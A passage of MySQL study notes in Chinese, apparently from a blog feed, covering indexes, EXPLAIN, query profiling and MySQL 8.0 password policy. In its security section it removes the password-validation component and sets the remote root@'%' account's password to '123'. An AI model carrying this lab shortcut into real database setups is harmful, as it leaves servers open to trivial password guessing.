class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql">[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> index <span class="hljs-keyword">from</span> stu\G;<br><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> <span class="hljs-number">1.</span> <span class="hljs-type">row</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><br><span class="hljs-keyword">Table</span>: stu<br>Non_unique: <span class="hljs-number">0</span><br>Key_name: <span class="hljs-keyword">PRIMARY</span><br>Seq_in_index: <span class="hljs-number">1</span><br>Column_name: StuID<br><span class="hljs-keyword">Collation</span>: A<br><span class="hljs-keyword">Cardinality</span>: <span class="hljs-number">25</span><br>Sub_part: <span class="hljs-keyword">NULL</span><br>Packed: <span class="hljs-keyword">NULL</span><br><span class="hljs-keyword">Null</span>: <br>Index_type: BTREE<br>Comment: <br>Index_comment: <br>Visible: YES<br>Expression: <span class="hljs-keyword">NULL</span><br></code></pre></td></tr></table></figure><p>查询是否有使用index索引来进行查询，显示只遍历了一行，而不加索引字段进行查找，需要遍历整张表，需要遍历25行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sql">[hellodb]<span class="hljs-operator">&gt;</span>explain <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> hello.stu <span class="hljs-keyword">where</span> stuid<span class="hljs-operator">=</span><span class="hljs-number">10</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------+</span><br><span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> select_type <span class="hljs-operator">|</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">|</span> partitions <span class="hljs-operator">|</span> type  <span class="hljs-operator">|</span> possible_keys <span class="hljs-operator">|</span> key     <span class="hljs-operator">|</span> key_len <span class="hljs-operator">|</span> <span class="hljs-keyword">ref</span>   <span class="hljs-operator">|</span> <span class="hljs-keyword">rows</span> <span class="hljs-operator">|</span> filtered <span class="hljs-operator">|</span> Extra <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------+</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> SIMPLE      <span class="hljs-operator">|</span> stu   <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>       <span class="hljs-operator">|</span> const <span class="hljs-operator">|</span> <span class="hljs-keyword">PRIMARY</span>       <span class="hljs-operator">|</span> <span class="hljs-keyword">PRIMARY</span> <span class="hljs-operator">|</span> <span class="hljs-number">4</span>       <span class="hljs-operator">|</span> const <span class="hljs-operator">|</span>    <span class="hljs-number">1</span> <span class="hljs-operator">|</span>   <span class="hljs-number">100.00</span> <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>  <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span>, <span class="hljs-number">1</span> warning (<span class="hljs-number">0.00</span> sec)<br><br>explain <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> hellodb.students <span class="hljs-keyword">where</span> age<span class="hljs-operator">=</span><span class="hljs-number">22</span>;<br>[hellodb]<span class="hljs-operator">&gt;</span>explain <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> hellodb.stu <span class="hljs-keyword">where</span> age<span class="hljs-operator">=</span><span class="hljs-number">22</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-------------+</span><br><span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> select_type <span class="hljs-operator">|</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">|</span> partitions <span class="hljs-operator">|</span> type <span class="hljs-operator">|</span> possible_keys <span class="hljs-operator">|</span> key  <span class="hljs-operator">|</span> key_len <span class="hljs-operator">|</span> <span class="hljs-keyword">ref</span>  <span class="hljs-operator">|</span> <span class="hljs-keyword">rows</span> <span class="hljs-operator">|</span> filtered <span class="hljs-operator">|</span> Extra       <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-------------+</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> SIMPLE      <span class="hljs-operator">|</span> stu   <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>       <span class="hljs-operator">|</span> <span class="hljs-keyword">ALL</span>  <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>          <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span> <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span> <span class="hljs-operator">|</span>   <span class="hljs-number">25</span> <span class="hljs-operator">|</span>    <span class="hljs-number">10.00</span> <span class="hljs-operator">|</span> <span class="hljs-keyword">Using</span> <span class="hljs-keyword">where</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span>, <span class="hljs-number">1</span> warning (<span class="hljs-number">0.01</span> sec)<br><br><span class="hljs-keyword">show</span> profiles; <span class="hljs-comment">--可以查看sql语句的执行速度</span><br></code></pre></td></tr></table></figure><p>索引的优势：加速表的查询，不用遍历整张表，对某个字段加了索引，加快查询</p><p>索引的劣势：如果表数据经常更新（insert、update等），不建议用索引，因为需要时常更新索引，占用一定的库性能；而且索引的磁盘文件.idx也会占用一定的磁盘空间</p><p>特殊查询：只能查询左前缀相同的，按照比如订单号都是2022开头的，按这个次序来排序</p><h3 id="10万条记录表创建索引优化查询速度"><a href="#10万条记录表创建索引优化查询速度" class="headerlink" title="10万条记录表创建索引优化查询速度"></a>10万条记录表创建索引优化查询速度</h3><p>大表尽量避免做全表扫描，之前由存储过程生成的10w条记录的表testlog</p><p>存储过程：自动化的插入、更新同一张表的数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql">##用现有的存储过程<br><span class="hljs-keyword">call</span> sp_testlog;<br><br>##普通查询，使用limit限制从第三行开始，显示<span class="hljs-number">5</span>行<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> testlog limit <span class="hljs-number">3</span>,<span class="hljs-number">5</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">----+-----------+--------+</span><br><span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> name      <span class="hljs-operator">|</span> salary <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+-----------+--------+</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">4</span> <span class="hljs-operator">|</span> wang65321 <span class="hljs-operator">|</span> <span class="hljs-number">323142</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">5</span> <span class="hljs-operator">|</span> wang65606 <span class="hljs-operator">|</span> <span class="hljs-number">310887</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">6</span> <span class="hljs-operator">|</span> wang58624 <span class="hljs-operator">|</span> <span class="hljs-number">998574</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">7</span> <span class="hljs-operator">|</span> wang23413 <span class="hljs-operator">|</span> <span class="hljs-number">174936</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">8</span> <span class="hljs-operator">|</span> wang17228 <span class="hljs-operator">|</span> <span class="hljs-number">336622</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+-----------+--------+</span><br><span class="hljs-number">5</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.03</span> sec)<br><br><br>##加入<span class="hljs-keyword">where</span>条件<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> testlog <span class="hljs-keyword">where</span> salary<span class="hljs-operator">=</span><span class="hljs-number">489141</span>; <br>explain <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> testlog <span class="hljs-keyword">where</span> salary<span class="hljs-operator">=</span><span class="hljs-number">489141</span>;<br><br>##创建salary的索引<br><span class="hljs-keyword">create</span> index idx_salary <span class="hljs-keyword">on</span> testlog(salary);<br><br>##查看<span class="hljs-keyword">sql</span>语句的执行情况，可以看到以索引来查询比没有索引的速度快了将近<span class="hljs-number">20</span>倍<br><span class="hljs-keyword">set</span> profiling<span class="hljs-operator">=</span><span class="hljs-keyword">ON</span>;<br><span class="hljs-keyword">show</span> profiles;<br><span class="hljs-keyword">show</span> profiles <span class="hljs-keyword">for</span> query ID;<br><br>##<span class="hljs-keyword">show</span> profiles：查看<span class="hljs-keyword">sql</span>语句的执行速度<br>遍历<span class="hljs-number">100</span>万条记录查询出一个salary的值，使用索引是<span class="hljs-number">0.0003</span>s，不使用索引是<span class="hljs-number">0.01</span>s，速度有很大的差别了<br>(root<span class="hljs-variable">@localhost</span>) [hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> profiles;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+------------+-------------------------------------------+</span><br><span class="hljs-operator">|</span> Query_ID <span class="hljs-operator">|</span> Duration   <span class="hljs-operator">|</span> Query                                     <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+------------+-------------------------------------------+</span><br><span class="hljs-operator">|</span>        <span class="hljs-number">1</span> <span class="hljs-operator">|</span> <span class="hljs-number">0.00030300</span> <span class="hljs-operator">|</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> testlog <span class="hljs-keyword">where</span> salary<span class="hljs-operator">=</span><span class="hljs-number">489141</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>        <span class="hljs-number">2</span> <span class="hljs-operator">|</span> <span class="hljs-number">0.00007425</span> <span class="hljs-operator">|</span> <span class="hljs-keyword">drop</span> index idx_salary <span class="hljs-keyword">from</span> testlog        <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>        <span class="hljs-number">3</span> <span class="hljs-operator">|</span> <span class="hljs-number">0.00987600</span> <span class="hljs-operator">|</span> <span class="hljs-keyword">drop</span> index idx_salary <span class="hljs-keyword">on</span> testlog          <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>        <span class="hljs-number">4</span> <span class="hljs-operator">|</span> <span class="hljs-number">0.01724175</span> <span class="hljs-operator">|</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> testlog <span class="hljs-keyword">where</span> salary<span class="hljs-operator">=</span><span class="hljs-number">489141</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+------------+-------------------------------------------+</span><br></code></pre></td></tr></table></figure><h1 id="10-mysql安全加固？"><a href="#10-mysql安全加固？" class="headerlink" title="10.mysql安全加固？"></a>10.mysql安全加固？</h1><p>在MySQL 8.0以前的版本，一般都会使用mysql_secure_installation这个脚本，这个脚本的执行方式在于MySQL客户端的执行命令</p><p><img src="2792175-20220912180417761-1883192853.png" alt="img"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql_secure_installation<br><br>##执行步骤<br><span class="hljs-number">1.</span>输入现有root用户的密码，可以到安装MySQL的日志里面找到temporary密码<br>grep temporary mysql.log<br><span class="hljs-number">2.</span>重置MySQL密码<br><span class="hljs-number">3.</span>删除匿名用户<br><span class="hljs-number">4.</span>删除test库(<span class="hljs-number">8.0</span>后没有test库了)<br><span class="hljs-number">5.</span>done<br></code></pre></td></tr></table></figure><h2 id="mysql8-0的密码策略-密码验证组件"><a href="#mysql8-0的密码策略-密码验证组件" class="headerlink" title="mysql8.0的密码策略+密码验证组件"></a>mysql8.0的密码策略+密码验证组件</h2><p>可以查看user表的password plugin插件，以及MySQL自带的密码验证组件validate_password component，这个密码验证组件在安装MySQL的时候默认开启</p><p>使用caching_sha2_password 这个密码插件的话，需要遵循MySQL8.0的新的密码特性，比较复杂</p><p>show variables like ‘default_authentication_plugin%’;：默认的MySQL身份插件</p><p>—&gt;在生产中可以考虑密码策略，需要更高的强度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs sql">查看密码管理策略<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%caching_sha2_password%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------------+-----------------+</span><br><span class="hljs-operator">|</span> Variable_name                                <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span>           <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------------+-----------------+</span><br><span class="hljs-operator">|</span> caching_sha2_password_auto_generate_rsa_keys <span class="hljs-operator">|</span> <span class="hljs-keyword">ON</span>              <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> caching_sha2_password_digest_rounds          <span class="hljs-operator">|</span> <span class="hljs-number">5000</span>            <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> caching_sha2_password_private_key_path       <span class="hljs-operator">|</span> private_key.pem <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> caching_sha2_password_public_key_path        <span class="hljs-operator">|</span> public_key.pem  <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------------+-----------------+</span><br><span class="hljs-number">4</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>##查看密码插件<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,host,plugin <span class="hljs-keyword">from</span> mysql.user;        <br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------+-----------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">user</span>             <span class="hljs-operator">|</span> host      <span class="hljs-operator">|</span> plugin                <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------+-----------------------+</span><br><span class="hljs-operator">|</span> root             <span class="hljs-operator">|</span> <span class="hljs-operator">%</span>         <span class="hljs-operator">|</span> caching_sha2_password <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> wp               <span class="hljs-operator">|</span> <span class="hljs-operator">%</span>         <span class="hljs-operator">|</span> caching_sha2_password <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> catyer           <span class="hljs-operator">|</span> <span class="hljs-number">10.0</span><span class="hljs-number">.0</span>.<span class="hljs-operator">%</span>  <span class="hljs-operator">|</span> mysql_native_password <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mysql.infoschema <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span> caching_sha2_password <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mysql.session    <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span> caching_sha2_password <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mysql.sys        <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span> caching_sha2_password <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> root             <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span> caching_sha2_password <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> wpuser           <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span> caching_sha2_password <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------+-----------------------+</span><br><span class="hljs-number">8</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">alter</span> <span class="hljs-keyword">user</span> root@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123&#x27;</span>;<br>ERROR <span class="hljs-number">1819</span> (HY000): Your password does <span class="hljs-keyword">not</span> satisfy the <span class="hljs-keyword">current</span> policy requirements<br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>需要加上<span class="hljs-keyword">with</span> mysql_native_password<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">user</span> root@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">with</span> mysql_native_password <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123&#x27;</span>;<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;default_authentication_plugin%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------+-----------------------+</span><br><span class="hljs-operator">|</span> Variable_name                 <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span>                 <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------+-----------------------+</span><br><span class="hljs-operator">|</span> default_authentication_plugin <span class="hljs-operator">|</span> caching_sha2_password <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------+-----------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><h2 id="MySQL密码验证组件：validate-password-component"><a href="#MySQL密码验证组件：validate-password-component" class="headerlink" title="MySQL密码验证组件：validate_password component"></a>MySQL密码验证组件：validate_password component</h2><p>指定复杂的密码策略：<a href="https://blog.csdn.net/zy_1995/article/details/102706728">https://blog.csdn.net/zy_1995/article/details/102706728</a></p><p>如果不想要这个密码策略可以删除这个组件，卸载组件，参考官方文档可以删除</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs sql">[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;validate_password%&#x27;</span>;<br><span class="hljs-keyword">Empty</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------+--------+</span><br><span class="hljs-operator">|</span> Variable_name                        <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span>  <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------+--------+</span><br><span class="hljs-operator">|</span> validate_password.check_user_name    <span class="hljs-operator">|</span> <span class="hljs-keyword">ON</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> validate_password.dictionary_file    <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> validate_password.length             <span class="hljs-operator">|</span> <span class="hljs-number">8</span>      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> validate_password.mixed_case_count   <span class="hljs-operator">|</span> <span class="hljs-number">1</span>      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> validate_password.number_count       <span class="hljs-operator">|</span> <span class="hljs-number">1</span>      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> validate_password.policy             <span class="hljs-operator">|</span> MEDIUM <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> validate_password.special_char_count <span class="hljs-operator">|</span> <span class="hljs-number">1</span>      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------+--------+</span><br><span class="hljs-number">7</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>##删除组件<br>UNINSTALL COMPONENT <span class="hljs-string">&#x27;file://component_validate_password&#x27;</span>;<br>##安装组件<br>INSTALL COMPONENT <span class="hljs-string">&#x27;file://component_validate_password&#x27;</span>;<br><br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;validate_password%&#x27;</span>;<br><span class="hljs-keyword">Empty</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec<br>           <br>##可以使用简单密码策略了           <br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">alter</span> <span class="hljs-keyword">user</span> root@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123&#x27;</span>;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.01</span> sec)<br></code></pre></td></tr></table></figure><h2 id="修改MySQL的密码策略plugin"><a href="#修改MySQL的密码策略plugin" class="headerlink" title="修改MySQL的密码策略plugin"></a>修改MySQL的密码策略plugin</h2><p>1.可以在/etc/my.cnf内指定密码策略，重启mysqld服务生效</p><p>2.在修改某个user@’host’的时候，加上with mysql_native_password</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>default_authentication_plugin<span class="hljs-operator">=</span>mysql_native_password<br>systemctl restart mysqld<br><br>##成功完成<br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;default_authentication_plugin%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------+-----------------------+</span><br><span class="hljs-operator">|</span> Variable_name                 <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span>                 <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------+-----------------------+</span><br><span class="hljs-operator">|</span> default_authentication_plugin <span class="hljs-operator">|</span> mysql_native_password <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------+-----------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.15</span> sec)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>用ChatGPT搭建代码知识库</title>
    <link href="/2023/07/27/%E7%94%A8ChatGPT%E6%90%AD%E5%BB%BA%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E5%BA%93/"/>
    <url>/2023/07/27/%E7%94%A8ChatGPT%E6%90%AD%E5%BB%BA%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E5%BA%93/</url>
    
